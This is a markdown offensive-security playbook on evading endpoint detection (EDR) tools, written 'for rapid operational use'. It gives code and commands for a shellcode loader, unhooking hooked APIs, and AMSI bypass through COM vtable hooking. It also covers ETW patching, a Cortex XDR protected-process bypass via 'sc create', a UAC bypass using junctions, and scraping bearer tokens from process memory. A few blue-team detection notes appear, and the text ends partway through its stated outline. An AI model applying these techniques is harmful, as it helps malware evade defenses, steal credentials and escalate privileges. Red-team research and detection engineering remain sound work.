# EDR Evasion & Detection Engineering (2026 Edition)

> All original content preserved + 2026 additions. Reorganized by function for rapid operational use.
> Last restructured: April 2026

---

## How This Document Is Organized

| Tier | Purpose | Use during |
|------|---------|------------|
| **F1 Fundamentals** | How EDR works, detection methods, telemetry sources, architecture | Learning / review |
| **F2 Evasion Arsenal** | All evasion techniques grouped by category (memory, hooks, process, callstack, ETW/AMSI, network, kernel) | Build & operate phase |
| **F3 Platform-Specific** | Windows 11 24H2+, macOS, Linux/K8s, mobile | Engagement scoping |
| **F4 Infrastructure Attacks** | Directly attacking EDR components (drivers, ALPC, namespace, scanning engine DoS) | Advanced ops |
| **F5 Strategy & Tooling** | OpSec playbook, persistence patterns, testing lab, tool index | Planning & post-op |

**Maturity tags:**
- `STABLE` proven, reproducible, in public tooling
- `EMERGING` 2024–2026 campaigns/research, needs tuning
- `EXPERIMENTAL` research-grade, lab-only until validated

---

## Table of Contents

### F1 Fundamentals
- [1.1 AV vs EDR](#11-av-vs-edr)
- [1.2 Windows Execution Flow](#12-windows-execution-flow)
- [1.3 EDR Architecture & Components](#13-edr-architecture--components)
- [1.4 EDR Visibility Methods](#14-edr-visibility-methods)
- [1.5 Detection Methods](#15-detection-methods)
- [1.6 Hook Implementation](#16-hook-implementation)
- [1.7 ETW Monitoring & Event Correlation](#17-etw-monitoring--event-correlation)
- [1.8 Shellcode Loader Pattern](#18-shellcode-loader-pattern)

### F2 Evasion Arsenal
- [2.1 Memory-Based Evasion](#21-memory-based-evasion)
- [2.2 Hook Evasion (Unhooking, Direct/Indirect Syscalls)](#22-hook-evasion)
- [2.3 Process Manipulation](#23-process-manipulation)
- [2.4 Callstack Manipulation](#24-callstack-manipulation)
- [2.5 Control Flow Manipulation](#25-control-flow-manipulation)
- [2.6 ETW & AMSI Evasion](#26-etw--amsi-evasion)
- [2.7 Network-Based EDR Silencing](#27-network-based-edr-silencing)
- [2.8 Kernel-Mode EDR Killers (BYOVD)](#28-kernel-mode-edr-killers-byovd)
- [2.9 Additional Evasion Techniques](#29-additional-evasion-techniques)

### F3 Platform-Specific
- [3.1 Windows 11 24H2+ Security Baseline](#31-windows-11-24h2-security-baseline)
- [3.2 Firmware & Boot-Level Threats](#32-firmware--boot-level-threats)
- [3.3 macOS Evasion](#33-macos-evasion)
- [3.4 Linux / Container / Kubernetes](#34-linux--container--kubernetes)
- [3.5 Mobile (Android / iOS)](#35-mobile-android--ios)

### F4 Infrastructure Attacks
- [4.1 Driver Attack Surface Analysis](#41-driver-attack-surface-analysis)
- [4.2 ALPC Communication Attacks](#42-alpc-communication-attacks)
- [4.3 Namespace Object Exploitation](#43-namespace-object-exploitation)
- [4.4 Scanning Engine DoS](#44-scanning-engine-dos)
- [4.5 Telemetry Complexity Attacks (TCAs)](#45-telemetry-complexity-attacks-tcas)
- [4.6 Agent Tampering & Tamper-Protection Bypasses](#46-agent-tampering--tamper-protection-bypasses)
- [4.7 Cloud-Side XDR Telemetry Throttling & Poisoning](#47-cloud-side-xdr-telemetry-throttling--poisoning)

### F5 Strategy & Tooling
- [5.1 OpSec Quickstart (Lab)](#51-opsec-quickstart-lab)
- [5.2 General Evasion Strategy & Persistence](#52-general-evasion-strategy--persistence)
- [5.3 Practical Testing Lab Setup](#53-practical-testing-lab-setup)
- [5.4 Windows Defender Bypass Tools & WSC Abuse](#54-windows-defender-bypass-tools--wsc-abuse)
- [5.5 Enhance Protection (Blue Team Reference)](#55-enhance-protection-blue-team-reference)
- [5.6 2026 Additions & Watch List](#56-2026-additions--watch-list)

### Appendices
- [A. Diagrams](#appendix-a-diagrams)
- [B. Tool & Resource Index](#appendix-b-tool--resource-index)

---


# F1 Fundamentals

## 1.1 AV vs EDR

**Antivirus (preventive approach):**

- Static Analysis: Matching known signatures in files
- Dynamic Analysis: Limited behavioral monitoring/sandboxing
- Effective against known threats, weaker against advanced attacks

**EDR (proactive & investigative approach):**

- Continuous endpoint monitoring
- Behavioral analysis at kernel level
- Anomaly detection and post-compromise visibility
- Prioritizes incident response and investigation

## 1.2 Windows Execution Flow

Windows program execution follows a hierarchical flow:

1. **Applications** User programs like firefox.exe
2. **DLLs** Libraries providing Windows functionality without direct low-level access
3. **Kernel32.dll** Core DLL for memory management, process/thread creation
4. **Ntdll.dll** Lowest user-mode DLL that exposes the NT API interface to the kernel
5. **Kernel** Core OS component with unrestricted hardware access

Example operation flow (creating a file):

1. Application invokes `CreateFile` function
2. CreateFile forwards to `NtCreateFile`
3. Ntdll.dll triggers `NtCreateFile` syscall
4. Kernel creates the file and returns a handle

## 1.3 EDR Architecture & Components

EDR solutions consist of multiple components creating a complex attack surface.

**Client-side components:**

- **User-space Applications** Main agent processes and UI components
- **Kernel-space Drivers** Filter drivers, network drivers, software drivers
- **Communication Interfaces** IOCTLs, FilterConnectionPorts, ALPC, Named Pipes

**Component communication methods:**

- **Kernel-to-Kernel:** Exported functions, IOCTLs
- **User-to-Kernel:** IOCTLs, FilterConnectionPorts (minifilter-specific), ALPC
- **User-to-User:** ALPC, Named Pipes, Files, Registry

**Server-side components:**

- Cloud services and management consoles
- On-premise servers (some vendors)
- Custom protocols for agent-to-cloud communication

## 1.4 EDR Visibility Methods

EDR solutions require extended visibility into system activities:

- Filesystem monitoring via mini-filter drivers
- Process/module loading via image load kernel callbacks
- Process/.NET modules/Registry/kernel object events via ETW-TI
- Network monitoring via NDIS and network filtering drivers

### Static Analysis
- Extract information from binary: known malicious strings, threat actor IP/domains, malware binary hashes

### Dynamic Analysis
- Execute binary in a sandbox environment and observe it: network connections, registry changes, memory access, file creation/deletion
- AntiMalware Scan Interface (AMSI)

### Behavioral Analysis
- Observe the binary as it's executing, hook into functions/syscalls: user actions, system calls, kernel callbacks, commands executed in command line, which process is executing the code, Event Tracing for Windows

## 1.5 Detection Methods

### AV Signature Scanning
- Scans files using known signatures (YARA rules)
- Typically targets loaders and droppers
- Primarily static analysis of files on disk

### AV Emulation
- Runs suspicious programs in a simulated environment
- Triggers on behaviors without executing real code
- Used to detect obfuscated malware

### Usermode Hooks
- EDR hooks critical API calls in userspace (ntdll.dll)
- Monitors process creation, memory allocations, and network operations
- Allows for inspection before execution continues

### Kernel Telemetry
- Monitors events directly from the kernel
- Captures file, registry, process, and network operations
- Difficult to bypass as it operates at a lower level

### Memory Scanning
- Scans process memory for known signatures
- Triggers based on suspicious behavior
- Looks for shellcode, encryption, malicious strings
- **Modern context:**
  - Attackers also scan process memory for sensitive artifacts like authentication tokens. Copilot/IDE integrations, chat assistants, and browser extensions frequently cache Bearer/JWT tokens in memory.
  - Practical triage: search for `"Authorization: Bearer"`, `"eyJ"` (base64 JWT prefix), or provider-specific headers; dump minimal pages to avoid tripping anti-exfil rules.

### Memory Regions
- Monitors suspicious memory allocation patterns
- Flags RWX (read-write-execute) regions
- Tracks regions that change from RW to RX

### Callstack Analysis
- Examines the call stack of suspicious functions
- Verifies legitimate origin of critical operations
- Detects unusual function call chains

## 1.6 Hook Implementation

EDRs can't directly hook kernel memory due to PatchGuard, so they:

1. Inject their DLL into newly spawned processes
2. Position before malware can block/unmap it
3. Adjust `_PEB`, hook process's module IAT/Imports, and loaded libraries EAT/Exports
4. Implement trampolines, hooks, and detours

## 1.7 ETW Monitoring & Event Correlation

EDR maintains ring-buffer with per-process activities produced by ETW-TI:

- Processes, command lines, parent-child relationships
- File/Registry/Process open/write operations
- Created threads, their call stacks, starting addresses
- Native functions called
- Created .NET AppDomains, loaded .NET assemblies, static class names, methods

### Event Correlation
- High fidelity alert (such as LSASS open) triggers correlation of collected activities
- High memory/resources cost limits preservation of events to a time window
- ML/AI may compute risk scores and isolate TTP (Tactics, Techniques, and Procedures)

## 1.8 Shellcode Loader Pattern

Shellcode loaders typically follow this pattern:

```c
char *shellcode = "\xAA\xBB...";
char *dest = VirtualAlloc(NULL, 0x1234, 0x3000, PAGE_READWRITE);
memcpy(dest, shellcode, 0x1234)
VirtualProtect(dest, 0x1234, PAGE_EXECUTE_READ, &result)
(*(void(*)())(dest))();  // jump to dest: execute shellcode
```

---


# F2 Evasion Arsenal

## 2.1 Memory-Based Evasion

### EDR-Freeze `EMERGING`

A technique exploiting Windows Error Reporting (WER) to temporarily disable EDR/AV processes.

**Mechanism:**
- Leverages `WerFault.exe` and Windows Error Reporting infrastructure
- Suspends all threads in target EDR/AV processes indefinitely
- No kernel-mode access or driver exploitation required
- Operates entirely from user-mode context

**Technical implementation:**
- Trigger WER fault injection on target security process
- WER suspends all threads for crash dump generation
- Attacker maintains suspended state without completing crash handling
- Target process remains alive but non-functional

**Advantages:**
- No elevation required in default WER configurations
- Avoids detection heuristics for process termination
- Temporary disabling without unloading kernel drivers
- Minimal forensic footprint compared to driver killing

**Limitations:**
- Effectiveness varies by Windows version and WER configuration
- Some EDRs implement anti-suspension protections
- Temporary nature requires continuous re-application
- May generate WER event logs exposing the technique

> **Blue team detection:** Alert on `PssSuspendProcess` / `PssSuspendThread` API calls combined with `OpenProcess` targeting EDR process IDs, or monitor Event ID 1001 (Windows Error Reporting) with unusual source processes.

### Memory Encryption (Sleep Obfuscation) `STABLE`

Encrypts shellcode in memory when not in use.

**Popular techniques:**
- **SWAPPALA / SLE(A)PING** classic sleep-time memory encryption
- **Thread Pool / Pool Party** abuse Windows thread pool for execution
- **Gargoyle** timer-based code hiding
- **Ekko** ROP-style sleep obfuscation via `_CONTEXT` setup + APC with `NtContinue`
- **Cronos** alternative timer-based approach
- **Foliage** builds on Ekko pattern

**ROP-style sleep obfuscations (Ekko/FOLIAGE):**
- [Ekko](https://github.com/Cracked5pider/Ekko)
- [FOLIAGE](https://github.com/y11en/FOLIAGE)
- Setup `_CONTEXT` in advance so that `EIP/RIP` points to native API
- Schedule APC with `NtContinue` to jump to that requested API

### Secure Enclaves (VBS) `EMERGING`

- Virtualization-Based Security (VBS) enclaves provide an isolated user-mode TEE that even kernel-mode sensors cannot inspect under normal conditions.
- **Deprecation/support scope (Microsoft):**
  - Windows 11 ≤ 23H2: VBS enclaves are deprecated; existing enclaves signed with the legacy EKU (OID `1.3.6.1.4.1.311.76.57.1.15`) continue to run until re-signed. New enclave signing requires updated EKUs and is not supported on these versions.
  - Windows 11 24H2+ and Windows Server 2025: VBS enclaves are supported with new EKUs.
- Security fix: CVE-2024-49076 (VBS Enclave EoP) ensure December 2024+ updates are applied.
- Signing constraints: Only Microsoft-signed enclave DLLs or DLLs signed via Azure Trusted Signing load; test- or self-signed DLLs are rejected.
- **Architecture summary:**
  - Enclave host app (VTL0) invokes enclave APIs; enclave DLL executes in isolated user mode (VTL1) with restricted API surface; Secure Kernel validates integrity.
- Offensive considerations (lab): viable for secure storage of secrets/implants during sleep and for hiding sensitive code paths; limited by restricted API surface and signing requirements.
- Practical notes:
  - On unsupported SKUs/versions, enclave APIs may appear and return `STATUS_FEATURE_DEPRECATED`.
  - Prefer testing on Windows 11 24H2+/Server 2025 with proper signing.

### Malware Virtualization `STABLE`

- Embeds a custom virtual machine to execute bytecode instead of native code
- Makes static and dynamic analysis difficult through instruction obfuscation
- Prevents detection of instruction patterns and behavior prediction

**Implementation advantages:**
- Conceals malicious instructions from EDR monitoring
- Protects against code patching attempts
- Hinders behavioral analysis through custom execution model

**Multi-VM approach further evades detection:**
- Multiple VMs running concurrently disrupts heuristic pattern detection
- Each VM creates distinct event patterns, confusing EDR correlation
- "ETW noise" technique to blend with legitimate activity

**Deployment strategies:**
- Bytecode polling periodically fetching new instructions from C2
- Using transpilers to convert compiled binaries to custom bytecode
- Applying polymorphic engine to mutate VM code itself

**Successfully evaded detection for:**
- Initial shellcode/bytecode execution (subsequent actions still monitored)
- Specific AV/EDR patching routines (may require updates per product)
- Initial C2 communication (ongoing traffic patterns may be detected)
- Specific AD queries (patterns of queries can still be flagged)

### QEMU-Based Virtualization Evasion `EMERGING`

**Concept:** Deploy portable QEMU VMs to execute malicious code within guest OS, avoiding host-based EDR detection.

**Technical implementation:**
- Portable QEMU deployment via ZIP archives containing VM binaries and configurations
- Tiny Core Linux as lightweight guest OS (minimal footprint ~50MB)
- VBS scripts for automated VM deployment and execution
- Custom hostname generation for VM identification and tracking

**Configuration examples:**

```vbs
# VBS deployment script
Set shell = CreateObject("WScript.Shell")
shell.Run "tc.exe -m 512 -hda tc.qcow2 -netdev user,id=net0 -device e1000,netdev=net0"
```

```conf
# QEMU configuration file (upd.conf)
-m 512
-hda tc.qcow2
-netdev user,id=net0
-device e1000,netdev=net0
```

**Persistence mechanisms:**
- `bootlocal.sh` modifications for startup execution
- `filetool.lst` configuration for file persistence across reboots
- SSH service installation and configuration within guest VM
- Reverse SSH tunnels over port 443 for C2 communication

**Advanced techniques:**
- Anti-forensic SSH configuration (`StrictHostKeyChecking=no`, known hosts to `/dev/null`)
- SSL/NoSSL tool deployment for encrypted communications
- Randomized hostname generation to mask VM tracking
- Port 443 tunneling to blend with HTTPS traffic

**Detection evasion benefits:**
- Guest VM operations invisible to host-based EDR sensors
- VM network traffic appears as legitimate application activity
- File operations contained within guest filesystem
- Process execution isolated from host monitoring

**Limitations:**
- Requires administrative privileges for some QEMU operations
- VM resource consumption may be detectable
- Network traffic patterns might still trigger detection
- Initial VM deployment artifacts remain on host filesystem

---

## 2.2 Hook Evasion

### Unhooking `STABLE`

- Malware overwrites EDR hooks before executing payload
- Obtain original `ntdll.dll` from disk and overwrite it inside your own process
- Or start the malware process in suspended state and copy the clean `ntdll.dll` from your own memory before executing
- **Modern context:** While historically effective, relying solely on replacing `ntdll.dll` or its hooked sections is less reliable. Modern EDRs often use kernel callbacks, ETW, and other telemetry sources that are not bypassed by user-mode unhooking alone. This technique is often used in conjunction with others.
  > Accessing `ntdll.dll` file can be flagged; API call to overwrite it also might be hooked by EDR.

#### API Unhooking for AV Bypass

- Most EDR/AVs like BitDefender hook Windows APIs by replacing first bytes with `JMP` instructions (opcode `0xE9`)
- **Modern context:** Patching specific API prologues can bypass simple user-mode hooks, but comprehensive EDR solutions have additional detection layers (kernel events, behavioral analysis) that may still detect the malicious activity following the unhook.
- **How to identify hooked APIs:**
  - Create a test program that calls potentially hooked APIs
  - Examine first byte of API function using a debugger (like x64dbg)
  - If first byte is `0xE9`, the function is hooked
- **Common hooked APIs:**
  - `CreateRemoteThread` / `CreateRemoteThreadEx`
  - `VirtualAllocEx`
  - `WriteProcessMemory`
  - `OpenProcess`
  - `RtlCreateUserThread`
- **Unhooking approach:**
  1. Store original bytes of target APIs from clean system
  2. Identify hooked functions in memory
  3. Restore original bytes using `WriteProcessMemory` on the current process
  4. Execute malicious code using now-unhooked APIs

```c
// Find address of target API function
HANDLE kernelbase_handle = GetModuleHandle("kernel32");
LPVOID CreateRemoteThread_address = GetProcAddress(kernelbase_handle, "CreateRemoteThread");

// Check if function is hooked (first byte is 0xE9)
byte first_byte = (byte)*(char*)CreateRemoteThread_address;
if (first_byte == 0xe9) {
    // Replace with original bytes
    char original_bytes[] = "\x4C\x8B\xDC\x48\x83"; // Original prologue bytes
    WriteProcessMemory(GetCurrentProcess(), CreateRemoteThread_address, original_bytes, 5, NULL);
}
```

- May require separate execution for the final payload since some AVs block executing immediately after unhooking. **Modern EDRs might still correlate the unhooking activity with subsequent suspicious actions.**

#### Unhooking Tools
- [unhook BOF](https://github.com/rsmudge/unhook-bof) module refreshing (less reliable now due to alternative EDR telemetry sources)
- [Unhookme](https://github.com/mgeeky/UnhookMe) dynamic unhooking

### Direct System Calls `STABLE`

- Malware circumvents hook in system DLL by directly system-calling into kernel
- Implement own syscall in assembly and bypass `ntdll.dll` hooks
- Or obtain SSN (System Service Number) dynamically and call them (via [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2))
- Direct syscalls bypass user-mode hooks in `ntdll.dll` but do **not** inherently bypass kernel-level monitoring (e.g., kernel callbacks or ETW). EDRs are increasingly monitoring for patterns indicative of direct syscall usage itself (e.g., unusual call stack origins for syscalls).
  > Having syscall assembly instructions can be flagged; also this only helps the loader to evade the EDR, not the malware itself.
- Major EDR vendors now flag **non-ntdll syscall sites**; consider **return-address replication gadgets** to re-insert a plausible `ntdll` frame before the transition.

> Some EDRs flag syscalls originating outside `ntdll.dll`. Maintaining plausible stacks/return frames may be required to avoid heuristics.

#### Direct Syscall Tools

Bypasses user-mode hooks but not kernel monitoring. Requires System Service Dispatch Table (SSDT) index:

- [FreshyCalls](https://github.com/crummie5/FreshyCalls) sorting system call addresses
- [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) modernized syscall resolution
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) adds x86/Wow64 support
- [Runtime Function Table](https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/) reliable SSN computation

### Indirect System Calls `STABLE`

- Malware uses code fragments in kernel DLL without calling the hooked functions in those DLLs
- Prepare the system call in assembly then find a `syscall` instruction in `ntdll.dll` and jump to that location
- **Modern context:** This bypasses user-mode hooks but not necessarily kernel-level monitoring. Finding and jumping to existing `syscall` instructions can be less suspicious than embedding raw syscall stubs, but the subsequent kernel activity is still visible.
  > This is preferred. You can also boost evasion techniques by hiding inside a `.dll`.

---

## 2.3 Process Manipulation

### Early Cascade Injection `EMERGING`

Novel process injection technique targeting user-mode process creation.

- Combines elements of Early Bird APC with EDR-Preloading
- Avoids queuing cross-process APCs while maintaining minimal remote process interaction
- **Works by:**
  - Targeting processes during the transition from kernel-mode to user-mode (`LdrInitializeThunk`)
  - Leveraging callback pointers (like `g_pfnSE_DllLoaded`) during Windows process creation
  - Executing malicious code before EDR detection measures can initialize
- **Advantages:**
  - Operates before EDRs can initialize their hooks and detection measures
  - Particularly effective against EDRs that hook `NtContinue` or use delayed initialization
  - Avoids ETW telemetry that traditional injection techniques trigger
  - Minimal remote process interaction reduces detection footprint
  - More stealthy than traditional techniques like DLL hijacking or direct syscalls
- Key insight: EDRs typically load their detection measures after the `LdrInitializeThunk` function executes, providing a window of opportunity for code execution before security measures initialize
- Watch for early `NtCreateThreadEx` inside `LdrInitializeThunk`

### Early Startup Bypass `STABLE`

**Concept:** Execute malware before the EDR's user-mode component fully initializes, creating a window of opportunity.

**Implementation:**
- Target the gap between kernel driver loading and user-mode agent initialization
- Execute payload during system startup before EDR hooks are established
- Leverage services that start before EDR components

**Research findings (Cortex XDR):**
- Successfully executed Mimikatz with `lsadump::sam` without detection during early startup
- EDR kernel drivers may be loaded but user-mode hooks not yet established
- Timing window varies depending on system performance and EDR implementation

**Limitations:**
- Requires precise timing and understanding of EDR startup sequence
- May not work against EDRs with early kernel-level monitoring
- Window of opportunity may be brief on fast systems

### Waiting Thread Hijacking (WTH) `EMERGING`

- A stealthier version of classic Thread Execution Hijacking
- Intercepts the flow of a waiting thread and misuses it for executing malicious code
- Avoids suspicious APIs like `SuspendThread`/`ResumeThread` and `SetThreadContext` that trigger most alerts
- **Required handle access:**
  - For target process: `PROCESS_VM_OPERATION`, `PROCESS_VM_READ`, `PROCESS_VM_WRITE`
  - For target thread: `THREAD_GET_CONTEXT`
- **Uses less monitored APIs:**
  - `NtQuerySystemInformation` (with `SystemProcessInformation`)
  - `GetThreadContext`
  - `ReadProcessMemory`
  - `VirtualAllocEx`
  - `WriteProcessMemory`
  - `VirtualProtectEx`
- Implementation can be further obfuscated by splitting steps across multiple functions to evade behavioral signatures
- Primarily bypasses EDRs that focus on detecting specific API calls rather than behavioral patterns
- Effective against EDRs that are restrictive about remote execution methods but more lenient with allocations and writes
- Suitable for hiding the point at which implanted code was executed

### PPID Spoofing `STABLE`
- Creates process with fake parent process ID
- Hides true process creation chain
- Makes process tree analysis misleading

### Process Hiding (IRQL Manipulation) `STABLE`

A technique to hide processes from EDR monitoring by manipulating the Interrupt Request Level (IRQL):

- Raise the IRQL of current CPU core
- Create and queue Deferred Procedure Calls (DPCs) to raise the IRQL of other cores
- Perform sensitive task (for example, hiding process)
- Signal DPCs in other cores to stop spinning and exit
- Lower IRQL of current core back to original

```c
irql = RaiseIRQL();
dpcPtr = AcquireLock();
do_stuff();
ReleaseLock(dpcPtr);
LowerIRQL(irql);
```

This approach temporarily prevents EDR from monitoring the process during the critical operations.

> HVCI-enabled 23H2 kernels may crash when raising IRQL this way. Safer alternative: kernel-driver patching of `PsLookupProcessByProcessId`.

### UAC Bypass via Intel ShaderCache Directory `EMERGING`

- **Concept:** Exploits weak permissions (`Authenticated Users: Full Control`) on `%LOCALAPPDATA%\LocalLow\Intel\ShaderCache` combined with auto-elevated processes writing to this location.
- **Mechanism:**
  1. Clear directory: Requires aggressively terminating processes holding handles (`explorer.exe`, `sihost.exe`, etc.) and deleting files. Permissions might need adjustment (`icacls`). Launching `taskmgr.exe` briefly helps identify recently written filenames.
  2. Junction creation: Create a directory junction from `ShaderCache` to `\??\GLOBALROOT\RPC CONTROL`.
  3. Symbolic link: Create an object directory symbolic link (`CreateDosDevice`) from `Global\GLOBALROOT\RPC CONTROL\<recent_filename>` to a target DLL path (e.g., `\??\C:\Windows\System32\oci.dll`).
  4. Trigger write: Launch an auto-elevated process (e.g., `taskmgr.exe`) that writes to `ShaderCache`. The write follows the junction + symlink, creating a dummy file in `System32`.
  5. Overwrite & execute: Overwrite the created dummy file with actual malicious DLL. Launch a process (like `comexp.msc`) that loads the target DLL → elevated execution.

> Symlink/junction UAC races are build-dependent and brittle. Validate on the specific target build; many have partial or complete mitigations.

### PPL (Protected Process Light) Bypass `EMERGING`

**Palo Alto Cortex XDR PPL bypass technique:**

```powershell
# Create alternative service that launches cyserver.exe without PPL protection
sc create "fake_cyserver" binPath="C:\Program Files\Palo Alto Networks\Traps\cyserver.exe" start=auto
```

**How it works:**
- Creates a second service that launches the EDR's main process (cyserver.exe)
- Original PPL-protected service fails to start due to startup dependencies
- New service configuration is not protected by EDR drivers
- EDR process runs without PPL protection, expanding attack surface

**Limitations:**
- Service names beginning with "cyserver*" are blocked by some EDR implementations
- EDR functionality may remain intact despite PPL bypass
- Self-protection mechanisms may still be active at process level
- Vendor response varies may not be considered a security vulnerability

**Broader implications:**
- Demonstrates service configuration vulnerabilities in EDR implementations
- Shows potential for bypassing Windows security features through alternative execution paths
- Relevant for other EDRs that rely on PPL for self-protection

### Using `NtCreateUserProcess` for Stealthy Process Creation `STABLE`

The native API `NtCreateUserProcess()`, located in `ntdll.dll`, is the lowest-level user-mode function for creating processes. Calling it directly can bypass EDR hooks placed on higher-level functions like `CreateProcessW`.

**Key concepts:**
- **Bypass mechanism:** Avoids user-land hooks on more commonly monitored APIs like `CreateProcessW`.
- **Process parameters:** Requires careful setup of structures like `RTL_USER_PROCESS_PARAMETERS`, `PS_CREATE_INFO`, and `PS_ATTRIBUTE_LIST`.
  - `RTL_USER_PROCESS_PARAMETERS`: Defines process startup info (image path, command line, env vars). `ImagePathName` must be in NT path format (e.g., `\??\C:\Windows\System32\executable.exe`).
  - `PS_ATTRIBUTE_LIST`: Specifies attributes like image name.
- **Implementation details:** Involves initializing structures using `RtlInitUnicodeString`, `RtlCreateProcessParametersEx`, `RtlAllocateHeap`. The `ProcessParameters` argument is mandatory.

**High-level steps:**
1. Define the path to the executable using `UNICODE_STRING` and `RtlInitUnicodeString`
2. Create and populate `RTL_USER_PROCESS_PARAMETERS` using `RtlCreateProcessParametersEx`
3. Initialize a `PS_CREATE_INFO` structure
4. Allocate and initialize a `PS_ATTRIBUTE_LIST`, setting `PS_ATTRIBUTE_IMAGE_NAME`
5. Call `NtCreateUserProcess` with the prepared structures
6. Cleanup via `RtlFreeHeap` and `RtlDestroyProcessParameters`

This allows process creation with more direct control, potentially evading EDRs that primarily hook `kernel32.dll`. However, EDRs with kernel telemetry or deeper `ntdll.dll` hooks may still detect the call or subsequent behavior.

### Advanced Process Execution Alternatives
- [TangledWinExec](https://github.com/daem0nc0re/TangledWinExec) alternative process execution techniques
- [rad9800](https://github.com/rad9800/misc/blob/main/bypasses/WorkItemLoadLibrary.c) indirectly loading DLL through a work item

### Acquiring Process Handles (Without OpenProcess)
- Find `explorer.exe` window handle using `EnumWindows`
- Convert to process handle with `GetProcessHandleFromHwnd`
- Leverage `PROCESS_DUP_HANDLE` to duplicate into a pseudo handle for [Full Access](https://jsecurity101.medium.com/bypassing-access-mask-auditing-strategies-480fb641c158)

---

## 2.4 Callstack Manipulation

### Return Address Overwrite `STABLE`
- Overwrite function's return address with 0 → terminates call stack's unwinding algorithm
- Examination based on `DbgHelp!StackWalk64` fails
- Implement custom API resolver similar to `GetProcAddress`
  - Before calling out to suspicious functions, overwrite `RetAddr := 0`
  - When system API returns, restore own `RetAddr`

### Callstack Spoofing `STABLE`

- Manipulates the call stack to appear legitimate
- Makes it harder to detect malicious code execution
- **Tools and techniques:**
  - ThreadStackSpoofer
  - CallStackSpoofer
  - AceLdr
  - CallStackMasker
  - Unwinder
  - TitanLdr
  - [uwd](https://github.com/joaoviictorti/uwd) Rust library for call stack spoofing with `#[no_std]` support
    - Offers both `Synthetic` (thread-like stack emulation) and `Desync` (JOP gadget-based stack misalignment) methods
    - Provides inline macros for spoofing functions and syscalls
    - Compatible with both MSVC and GNU toolchains on x86_64

---

## 2.5 Control Flow Manipulation

### Control Flow Hijacking via Data Pointers `EMERGING`

- **Concept:** Overwrite function pointers in readable/writable `.data` sections to hijack control flow avoids `VirtualProtectEx` if the target pointer is already in a writable section.
- **Target:** Often targets pointers within `KnownDlls` (e.g., `ntdll.dll`, `combase.dll`) as they load at predictable base addresses.
- **Mechanism:**
  1. Identify a function pointer stored in a writable `.data` section
  2. In a target process, allocate memory for shellcode/stub
  3. Write the shellcode/stub to the allocated memory
  4. Overwrite the original function pointer to point to the shellcode/stub
  5. Execution is diverted when the legitimate code path calls the hijacked pointer
- **Example:** Hijacking `combase.dll!__guard_check_icall_fptr`
- **Advantages:**
  - Avoids commonly monitored APIs (`CreateRemoteThread`, `QueueUserAPC`)
  - If target pointer is already writable, avoids `VirtualProtectEx` entirely
- **Detection context:** EDRs may still detect `WriteProcessMemory` to `.data` sections or correlate unusual execution flow from a data segment.

### Hookchain `EMERGING`

- Resolve System Service Number
- Map critical functions:
  - `NtAllocateReserveObject`
  - `NtAllocateVirtualMemory`
  - `NtQueryInformationProcess`
  - `NtProtectVirtualMemory`
  - `NtReadVirtualMemory`
  - `NtWriteVirtualMemory`
- Create a relationship table with SSN + custom stub function of critical `ntdll.dll` and hooked functions
- Implant IAT hook at all DLL subsystems that point to `ntdll.dll` critical and hooked functions (DLL pre-loading)
- Use indirect system call + mapped critical functions and modification of IAT of key DLL functions before call to `ntdll.dll` to bypass EDR

---


## 2.6 ETW & AMSI Evasion

### ETW Patching `STABLE`

- Patch Event Tracing for Windows functionality
- Prevents telemetry from being sent to the EDR
- Targets ETW provider registration or logging mechanisms

> Defender engine 1.417 re-hooks common byte patches within ~50 ms. Prefer **callback filtering** (e.g., wrapping `EtwEventWriteFull`) or the patchless SharpBlock fork.

#### ETW Evasion Techniques

- Significant delays among risky events: `alloc`, `write`, `exec` "Driploader" style
- `ntdll!EtwEventWrite` patching
- Disabling tracing via `ntdll!EtwEventUnregister`

### AMSI Bypass / Patching `STABLE`

- Bypasses Anti-Malware Scan Interface
- Patches AMSI functionality in memory
- Prevents script scanning before execution
- Defender now ships dynamic signature **VirTool:Win64/HBPAmsibyp.A** that fires on known NOP-sled prologues. A stealthier option is to swap to a COM-visible PowerShell runspace instead of patching `AmsiScanBuffer`.

#### AMSI and ETW Evasion Implementation

- **AMSI** (`amsi.dll!AmsiScanBuffer`):
  - Patch the function prologue
  - Alternatively, increment AMSI magic value deeper in code
- **ETW** (`ntdll.dll!NtTraceEvent` and `ntdll.NtTraceControl`):
  - Use patchless strategy for evasion
- Consider tools like [SharpBlock](https://github.com/CCob/SharpBlock)

### Modern AMSI Bypass Techniques `EMERGING`

Classic `AmsiScanBuffer` patching (e.g., overwriting with `ret` or NOP sled) is now detected by Defender's **VirTool:Win64/HBPAmsibyp.A** signature and engine 1.425.x uses CFG/XFG checks to validate function integrity.

#### Patchless AMSI Bypass (VEH / vtable)

- **VEH-based bypass:** Register vectored exception handlers to set hardware breakpoints on `amsi.dll!AmsiScanBuffer` and re-route execution to a benign stub without byte-patching (a.k.a. VEH²). Avoids obvious prologue modifications.
- **COM/vtable approach:** Overwrite IAmsiStream vtable entries or CLSID pointers used during `AmsiInitialize` so the provider cannot be created and AMSI calls short-circuit again without altering `AmsiScanBuffer` bytes.
- Defender considerations: 2024–2025 engines re-hook common byte patches rapidly; patchless flows reduce simple signature hits but still leave behavioral traces.
- **Blue detections:**
  - Monitor `AddVectoredExceptionHandler` usage paired with debug register changes (`CONTEXT.Dr0-Dr7`) shortly before AMSI invocations.
  - Hunt for unusual call stacks entering `AmsiScanBuffer` that immediately return, and COM activation failures around AMSI provider creation.
  - ETW/PowerShell: alert on script engines loading `amsi.dll` followed by VEH registration and memory permission flips.

#### 1. COM VTable Hooking Method

Instead of patching `AmsiScanBuffer`, hook the IAmsiStream COM interface:

```cpp
// Locate IAmsiStream COM object in amsi.dll
typedef interface IAmsiStream IAmsiStream;

HRESULT HookAmsiStream() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return E_FAIL;

    // Locate IAmsiStream vtable (varies by Windows version)
    LPVOID** ppVTable = /* find IAmsiStream instance */;

    // Hook QueryInterface or GetAttribute methods
    DWORD oldProtect;
    VirtualProtect(ppVTable, sizeof(LPVOID) * 10, PAGE_READWRITE, &oldProtect);
    ppVTable[0] = (LPVOID*)MyQueryInterface;  // Return E_NOTIMPL
    VirtualProtect(ppVTable, sizeof(LPVOID) * 10, oldProtect, &oldProtect);
    return S_OK;
}

HRESULT STDMETHODCALLTYPE MyQueryInterface(IUnknown* This, REFIID riid, void** ppv) {
    return E_NOTIMPL;
}
```

